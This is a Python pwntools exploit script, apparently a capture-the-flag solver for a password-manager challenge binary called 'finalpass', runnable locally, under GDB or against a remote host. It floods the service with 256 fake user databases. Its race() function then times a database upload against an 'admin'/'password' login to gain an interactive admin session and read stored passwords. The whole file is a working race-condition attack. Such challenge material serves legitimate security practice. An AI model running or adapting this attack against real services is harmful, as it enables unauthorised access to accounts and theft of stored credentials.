#!/usr/bin/env python3

from binascii import hexlify, unhexlify
from pwn import *
import json
import typing
import uuid
import argparse as ap

# Local Imports
from DB import DB

BINARY_PATH = "../static/build"
BINARY_NAME = "finalpass"

context.log_level = "info"


class Interface:
    def __init__(self, io, db: DB):
        io.recvuntil(b"> ")
        io.timeout = 1
        self.io = io
        self.db = db
        self.hostname = ""

        if(isinstance(io, remote)):
            self.hostname = str(io.rhost)
        else:
            self.hostname = "localhost"

    def interactive(self):
        self.io.interactive()

    """Not logged in"""

    # 1
    def login(self):
        self.io.sendline(b"1")
        self.io.sendline(self.db.username)
        self.io.sendline(self.db.password)
        self.io.recvuntil(b"> ")

    # 2
    def send_db(self, db_to_send=None):
        if db_to_send is None:
            db_to_send = self.db
        
        buf = db_to_send.get_userdb_buf()

        self.io.sendline(b"2")
        self.io.recvuntil(b"port: ")

        port = int(self.io.recvline().strip())
        db_io = remote(self.hostname, port)

        time.sleep(0.2)

        db_io.send(p32(len(buf)))
        db_io.send(buf)
        db_io.close()

        self.io.recvuntil(b"> ")

    def make_fake_users(self, num_users):
        import pathlib

        p = pathlib.Path("./db")
        p.mkdir(exist_ok=True)

        os.chdir(p.absolute())

        for i in range(num_users):
            fake_username = "user" + uuid.uuid4().hex[:10]
            
            print(f"Making fake user {i}: {fake_username}")

            tmp_db = DB(fake_username, "password")
            # tmp_db.dump_db()
            self.send_db(tmp_db)
            self.logout()
        
        os.chdir("..")

    def race(self):
        buf = self.db.get_userdb_buf()
        self.io.sendline(b"2")
        self.io.recvuntil(b"port: ")
        port = int(self.io.recvline().strip())
        db_io = remote(self.hostname, port)

        time.sleep(0.2)

        self.io.sendline(b"1")
        time.sleep(0.5)
        db_io.send(p32(len(buf)))
        db_io.send(buf)

        self.io.sendline(b"admin")
        self.io.sendline(b"password")

        x = self.io.recvuntil(b"> ")
        print(x.decode())

        self.interactive()
        # print(self.view_password(0))


    """Logged in"""

    # 1
    def view_password(self, idx):
        self.io.sendline(b"1")
        self.io.sendlineafter(b"> ", str(idx).encode())
        pw = self.io.recvuntil(">")

        return pw

        # TODO: Strip password if needed

    # def add_password(self, pw)

    # 4
    def logout(self):
        self.io.sendline(b"5")
        self.io.recvuntil(b"> ")


def main(proc_io):
    db = DB("user", "password")
    db.add_fake_passes()
    io = Interface(proc_io, db)

    io.make_fake_users(256)
    time.sleep(2)
    io.race()


if __name__ == "__main__":
    parser = ap.ArgumentParser()
    parser.add_argument("--hostname")
    parser.add_argument("--port")
    parser.add_argument("--debug", "-d", action="store_true")

    run_type = parser.add_mutually_exclusive_group()

    run_type.add_argument("--GDB", action="store_true")
    run_type.add_argument("--LOCAL", action="store_true")
    args = parser.parse_args()

    if args.debug:
        context.log_level = "debug"

    proc_io = None

    gs = """
    #set max-visualize-chunk-size 0x500
    #break free
    continue
    """

    if args.GDB:
        cur_dir = os.getcwd()

        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = gdb.debug(elf.path, gdbscript=gs)

        os.chdir(cur_dir)
    elif args.LOCAL:
        cur_dir = os.getcwd()

        os.chdir(BINARY_PATH)
        try:
            os.remove("db/user.db")
        except FileNotFoundError:
            pass


        elf = context.binary = ELF(BINARY_NAME)
        proc_io = process(elf.path)

        os.chdir(cur_dir)
    else:
        if not (args.hostname or args.port):
            parser.print_usage()
            print("error: the following arguments are required: --hostname, --port")
            exit(-1)
        proc_io = remote(args.hostname, args.port)

    main(proc_io)
